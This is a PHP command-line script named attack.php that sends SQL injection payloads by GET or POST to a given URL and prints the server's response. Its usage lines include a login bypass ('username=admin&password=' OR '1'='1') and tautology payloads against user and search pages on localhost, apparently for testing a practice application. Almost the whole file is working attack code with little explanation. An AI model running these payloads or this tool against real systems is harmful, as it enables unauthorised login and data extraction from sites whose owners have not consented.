<?php
// attack.php
// Usage:
// php attack.php get "http://localhost:8080/users.php?id=" "1 OR 1=1"
// php attack.php get "http://localhost:8080/search.php?keyword=" "%' OR '1'='1"
// php attack.php post "http://localhost:8080/login.php" "username=admin&password=' OR '1'='1"

// Simple HTTP requester for testing SQL injection (read-only examples).
if ($argc < 4) {
    echo "Usage:\n";
    echo " php attack.php get <url_prefix> <payload>\n";
    echo " php attack.php post <url> <body_kv_string>\n\n";
    echo "Examples:\n";
    echo " php attack.php get \"http://localhost:8080/users.php?id=\" \"1 OR 1=1\"\n";
    echo " php attack.php get \"http://localhost:8080/search.php?keyword=\" \"%' OR '1'='1\"\n";
    echo " php attack.php post \"http://localhost:8080/login.php\" \"username=admin&password=' OR '1'='1\"\n";
    exit(1);
}

$method = strtolower($argv[1]);
$url = $argv[2];
$payload = $argv[3];

function do_get($fullUrl) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $fullUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $resp = curl_exec($ch);
    $info = curl_getinfo($ch);
    $err = curl_error($ch);
    curl_close($ch);

    return [$resp, $info, $err];
}

function do_post($url, $body) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $resp = curl_exec($ch);
    $info = curl_getinfo($ch);
    $err = curl_error($ch);
    curl_close($ch);

    return [$resp, $info, $err];
}

if ($method === 'get') {
    // url is prefix; payload will be urlencoded and appended
    $full = $url . urlencode($payload);
    echo "GET -> $full\n\n";
    list($resp, $info, $err) = do_get($full);
    if ($err) {
        echo "CURL error: $err\n";
    } else {
        echo "HTTP/{$info['http_code']}  (body length: ".strlen($resp).")\n";
        echo "----- RESPONSE START -----\n";
        echo substr($resp, 0, 2000); // show first 2000 chars
        if (strlen($resp) > 2000) echo "\n... (truncated)\n";
        echo "\n----- RESPONSE END -----\n";
    }
} elseif ($method === 'post') {
    echo "POST -> $url\n";
    echo "BODY -> $payload\n\n";
    list($resp, $info, $err) = do_post($url, $payload);
    if ($err) {
        echo "CURL error: $err\n";
    } else {
        echo "HTTP/{$info['http_code']}  (body length: ".strlen($resp).")\n";
        echo "----- RESPONSE START -----\n";
        echo substr($resp, 0, 2000);
        if (strlen($resp) > 2000) echo "\n... (truncated)\n";
        echo "\n----- RESPONSE END -----\n";
    }
} else {
    echo "Unsupported method: $method\n";
    exit(2);
}
